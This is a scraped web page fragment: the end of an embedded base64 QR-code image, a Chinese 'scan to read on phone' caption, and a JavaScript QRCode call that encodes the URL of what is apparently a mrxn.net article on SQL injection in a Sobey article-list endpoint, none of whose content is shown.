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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 